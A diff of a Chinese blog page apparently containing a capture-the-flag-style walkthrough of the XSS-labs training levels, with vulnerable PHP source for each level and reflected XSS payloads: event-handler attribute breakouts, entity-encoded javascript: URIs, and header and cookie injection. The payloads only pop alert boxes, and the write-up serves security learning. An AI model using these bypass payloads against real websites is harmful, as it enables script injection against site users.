@@ -9,6 +9,8 @@
     
     <title>
         
+            XSS-labs通关笔记 |
+        
         n3ym4r&#39;s blog
     </title>
     
@@ -29,8 +31,8 @@
 
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","logo":"/images/logo.svg","favicon":"/images/logo.svg","avatar":"/images/avatar.svg","font_size":null,"font_family":null,"left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":false,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":{"enable":false}},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block_tools":{"enable":true,"style":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.9"};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","logo":"/images/logo.svg","favicon":"/images/logo.svg","avatar":"/images/avatar.svg","font_size":null,"font_family":null,"left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Pay attention to safety!","font_color":null,"hitokoto":{"enable":false}},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block_tools":{"enable":true,"style":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.9"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
   </script>
@@ -112,9 +114,15 @@
                         </li>
                     
                     
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
                 </ul>
             </div>
             <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
                 <div class="icon-item menu-bar">
                     <div class="menu-bar-middle"></div>
@@ -170,7 +178,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation"></span>
+            <span class="title-hover-animation">XSS-labs通关笔记</span>
         </div>
 
         
@@ -192,20 +200,50 @@
         
             <i class="fa-regular fa-calendar-plus"></i>&nbsp;
         
-        <span class="pc">2022-10-16 10:44:29</span>
-        <span class="mobile">2022-10-16 10:44</span>
+        <span class="pc">2020-04-07 21:55:14</span>
+        <span class="mobile">2020-04-07 21:55</span>
     </span>
     
         <span class="article-update-date article-meta-item">
         <i class="fas fa-file-pen"></i>&nbsp;
-        <span class="pc">2022-09-12 14:32:22</span>
+        <span class="pc">2022-10-16 20:08:32</span>
     </span>
     
     
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
     
 
     
     
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>4.3k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>20 Mins</span>
+        </span>
     
     
 </div>
@@ -216,9 +254,9 @@
         
 
         <div class="article-content markdown-body">
-            <h1 id="XSS-labs通关笔记"><a href="#XSS-labs通关笔记" class="headerlink" title="XSS-labs通关笔记"></a>XSS-labs通关笔记</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911140948713.png" alt="image-20220911140948713"></p>
+            <h1 id="XSS-labs通关笔记"><a href="#XSS-labs通关笔记" class="headerlink" title="XSS-labs通关笔记"></a>XSS-labs通关笔记</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.46f551gs9x80.webp"></p>
 <p>我们可以看到这里将name的参数值，插入到了<h2> </h2>中，这里就是反射型xss，直接给name重新赋值。</p>
-<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911141228367.png" alt="image-20220911141228367"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.1wojnmrup40w.webp"></p>
 <p>服务器并没有进行任何的过滤，我们可以看看服务器端</p>
 <h4 id="服务器端源代码"><a href="#服务器端源代码" class="headerlink" title="服务器端源代码"></a>服务器端源代码</h4><p><code>&lt;/script&gt;</code></p>
 <p><code>&lt;title&gt;欢迎来到level1&lt;/title&gt;</code></p>
@@ -236,11 +274,11 @@
 <p><code>?&gt;</code></p>
 <p><code>&lt;/body&gt;</code></p>
 <p><code>&lt;/html&gt;</code></p>
-<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911143003578.png" alt="image-20220911143003578"></p>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.2ilca4prtjs0.webp"></p>
 <p>可以发现，通过get传参提交，经过服务器的动态处理之后又会将参数keyword的值插入到<code>&lt;h2&gt; &lt;/h2&gt;</code>标签之中以及</p>
 <p>添加到<code>&lt;input&gt;</code>标签中的value属性的值内。</p>
 <p>我们尝试用上关的payload提交</p>
-<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911143415145.png" alt="image-20220911143415145"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.1t99oq6bkosg.webp"></p>
 <p>可以看到，在<code>&lt;h2&gt; &lt;/h2&gt;</code>标签之中的恶意代码被编码了，其中<code>&lt;</code>和<code>&gt;</code>都被编码成了html字符实体，猜测在服务器端用<code>htmlspecialchars()函数</code>对keyword参数的值进行了处理，接着往下看可以看到插入到value参数值中的恶意代码并没有被编码而是直接原样返回，但是问题是这里的js代码在标签属性值中，浏览器是无法执行的，既然上面的恶意代码被编码了，那么只能从属性值中的恶意代码处进行突破了。</p>
 <p>要想浏览器执行这里的弹窗代码，只需要<strong>将属性的引号和标签先闭合</strong>就可以了</p>
 <p>用”&gt;闭合前面的&lt;input，再用&#x2F;&#x2F;将后面的”注释掉。</p>
@@ -261,7 +299,7 @@
 <p><code>echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</code></p>
 <p><code>?&gt;</code></p>
 <h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>简单测试，发现与第二关相比，这里将属性值这里也进行了<code>htmlspecialchars()</code>函数处理。</p>
-<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911145010616.png" alt="image-20220911145010616"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.3x8axmk2pv20.webp"></p>
 <p>这里，无法使用标签，因为标签都是带有&lt;&gt;符号的，就会被转义。但该函数不会转义单引号，可以采用<strong>事件</strong>闭合标签。</p>
 <h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p> <code>&#39; onclick=&#39;alert(1)</code>&#x2F;&#x2F;当单击鼠标时运行脚本</p>
 <p><code>&#39; onmouseover=&#39;alert(1)</code>&#x2F;&#x2F;当鼠标指针移至元素之上时运行脚本</p>
@@ -276,7 +314,7 @@
 <p><code>&lt;/center&gt;&quot;;</code></p>
 <p><code>?&gt;</code></p>
 <h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars ()"></a>htmlspecialchars ()</h4><p>将特殊字符转换为html实体</p>
-<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911150558305.png" alt="image-20220911150558305"></p>
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.2ltfhjxz3ji0.webp"></p>
 <p>可以看到&lt;&gt;符号被替换成了空</p>
 <p>但是事件不需要用到&lt;&gt;，所以直接用<strong>鼠标事件</strong>插入</p>
 <h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p><code>&quot; onmouseover=&quot;alert(/xss/)</code></p>
@@ -365,7 +403,7 @@
 <p><code>echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;</code></p>
 <p><code>?&gt;</code></p>
 <p>可以看到将大部分能用到的字符都做了破坏，看到友情链接那里，我们可以使用编码的方式绕过</p>
-<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911155344507.png" alt="image-20220911155344507"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.6ujrb8i860c0.webp"></p>
 <h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;</code></p>
 <h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><h4 id="源代码-6"><a href="#源代码-6" class="headerlink" title="源代码"></a>源代码</h4><pre><code>&lt;?php 
 
@@ -429,10 +467,10 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
 </code></pre>
 <p>if(false&#x3D;&#x3D;&#x3D;strpos($str7,’http:&#x2F;&#x2F;‘))  判断是否包含http:&#x2F;&#x2F;然后返回,这里还是可以通过编码来绕过</p>
 <h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h4><p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</code></p>
-<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911184437126.png" alt="image-20220911184437126"></p>
+<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.6s63f3ojisg0.webp"></p>
 <p>可以看到有三个input标签，我们得测试出哪个表单可以突破</p>
 <p>构造语句：<code>?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;</code></p>
-<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911185059255.png" alt="image-20220911185059255"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.6ap3ukt49a80.webp"></p>
 <p>t_sort时，出现一个输入框，所以我们可以确定了</p>
 <h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h4><p><code>?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
 <h4 id="源代码-7"><a href="#源代码-7" class="headerlink" title="源代码"></a>源代码</h4><p>我们可以再看看源代码</p>
@@ -469,11 +507,11 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
 <p><code>?&gt;</code></p>
 <p>这一关卡和上面的一关非常的像多了一个input表单的信息，在服务器端还将请求头中的referer头的值赋给了str11这个变量，$_SERVER[‘HTTP_REFERER’]  #链接到当前页面的前一页面的 URL 地址，也就是说这里可以做点文章。在将变量值中的&lt;和&gt;删除之后就会插入到t_ref这个标签的<strong>value</strong>属性值中。而上一关的t_sort标签虽然也能接收并显示参数值，但是这个参数值是要用htmlspecialchars()函数处理的。</p>
 <p>这里，我们就可以抓包，将数据包中的referer改为我们的恶意代码</p>
-<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911190554237.png" alt="image-20220911190554237"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.471sf6vo8xi0.webp"></p>
 <h4 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h4><p><code>referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
-<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911191107302.png" alt="image-20220911191107302"></p>
+<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.2dy1tugsqe3o.webp"></p>
 <p>查看网页源码，我们发现，有一个和ua头一样的参数值，我们可以大胆猜测，这关测试点就在ua头，抓包改包试试</p>
-<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911191512274.png" alt="image-20220911191512274"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.qomq2l6d1io.webp"></p>
 <p>成功</p>
 <h4 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h4><p><code>User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
 <h4 id="源代码-9"><a href="#源代码-9" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
@@ -500,7 +538,7 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
 <p>在这里变量str和str00的值都是需要被htmlspecialchars()函数处理过</p>
 <h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>13关猜测还是与数据头有关</p>
 <p><img src="https://img-blog.csdnimg.cn/2020072419061647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvNDFnZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911203242098.png" alt="image-20220911203242098"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.35qn41zq4fs0.webp"></p>
 <p>可以看到，是将cookies里的值放入了t_cook中，修改为恶意代码</p>
 <h4 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h4><p><code>Cookie: user=1&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;</code></p>
 <h4 id="源代码-10"><a href="#源代码-10" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
@@ -521,7 +559,7 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
 <p><code>&lt;/center&gt;&#39;;</code></p>
 <p><code>?&gt;</code></p>
 <h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>修改iframe调用的文件来实现xss注入(但因为iframe调用的文件地址失效，无法进行测试</p>
-<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912135642044.png" alt="image-20220912135642044"></p>
+<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.62eyhguere00.webp"></p>
 <p>可以看到我们提交的src参数被插入到了<code>&lt;span&gt;</code>标签的<code>class</code>属性值中，但是前面还有<code>ng-include</code>这样的字符。</p>
 <p><code>ng-include</code>是<code>angular js</code>中的东西，其作用相当于php的include函数。这里就是将<code>1.gif</code>这个文件给包含进来。</p>
 <h4 id="ng-include相关知识点"><a href="#ng-include相关知识点" class="headerlink" title="ng-include相关知识点"></a>ng-include相关知识点</h4><p><strong>1、ng-include 指令用于包含外部的 HTML文件。</strong></p>
@@ -541,7 +579,7 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
 <p><code>$str = $_GET[&quot;src&quot;];</code></p>
 <p><code>echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;</code></p>
 <p><code>?&gt;</code></p>
-<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912140337047.png" alt="image-20220912140337047"></p>
+<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.oadka56x0bk.webp"></p>
 <p>可以看到，我们输入的值被插到了<center>标签中，我们尝试直接弹窗，发现很多字符被编码，来看看源代码</p>
 <h4 id="源代码-12"><a href="#源代码-12" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
 <p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
@@ -565,13 +603,13 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
 
 <p>回车可以用url编码%0a表示</p>
 <h4 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h4><p><code>&lt;img%0Asrc=1%0Aonerror=alert(1)&gt;</code></p>
-<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912141605920.png" alt="image-20220912141605920"></p>
+<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.79mvat1x84c.webp"></p>
 <p>可以看到提交的参数插入到了<embed>标签的src属性中，尝试直接弹窗，发现转义了很多符号。</p>
 <p>尝试构造事件弹窗，可以看到这里的src没有用引号闭合，我们就不用管</p>
 <h4 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h4><p><code>onclick=alert(&#39;xss&#39;)</code></p>
 <pre><code>onmousedown=&#39;alert(1)&#39;
 </code></pre>
-<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912142104313.png" alt="image-20220912142104313"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/20221016/image.2jxajvtwct40.webp"></p>
 <h4 id="源代码-13"><a href="#源代码-13" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code>·</p>
 <p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
 <p><code>echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</code></p>
@@ -586,11 +624,11 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul class="copyright-info-content">
-        <li>Post title：</li>
+        <li>Post title：XSS-labs通关笔记</li>
         <li>Post author：n3ym4r</li>
-        <li>Create time：2022-10-16 10:44:29</li>
+        <li>Create time：2020-04-07 21:55:14</li>
         <li>
-            Post link：https://n3ym4r.github.io/2022/10/16/xss-labs通关笔记/
+            Post link：https://n3ym4r.github.io/2020/04/07/xss-labs通关笔记/
         </li>
         <li>
             Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
@@ -602,6 +640,14 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
         
 
         
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E7%AC%94%E8%AE%B0/">#笔记</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
 
         
             <div class="article-nav">
@@ -609,13 +655,13 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
                     <div class="article-prev">
                         <a class="prev"
                            rel="prev"
-                           href="/2022/10/16/sql%E6%B3%A8%E5%85%A5/"
+                           href="/2022/10/15/hello-world/"
                         >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
                             <span class="title flex-center">
-                                <span class="post-nav-title-item"></span>
+                                <span class="post-nav-title-item">Hello World</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
@@ -625,10 +671,10 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2022/10/15/hello-world/"
+                           href="/2020/04/07/sql%E6%B3%A8%E5%85%A5/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">Hello World</span>
+                                <span class="post-nav-title-item">SQL注入学习笔记</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex-center">
@@ -721,10 +767,6 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
         
 
         
-            <li class="tools-item tool-scroll-to-top flex-center">
-                <i class="fas fa-arrow-up"></i>
-            </li>
-        
 
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
@@ -735,6 +777,11 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
         <li class="tools-item tool-toggle-show flex-center">
             <i class="fas fa-cog fa-spin"></i>
         </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
         
     </ul>
 </div>
@@ -757,6 +804,35 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
 
 
     
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
 
 </main>
 
@@ -775,6 +851,10 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
 
 
 
+
+
+    
+<script src="/js/local-search.js"></script>
 
 
 
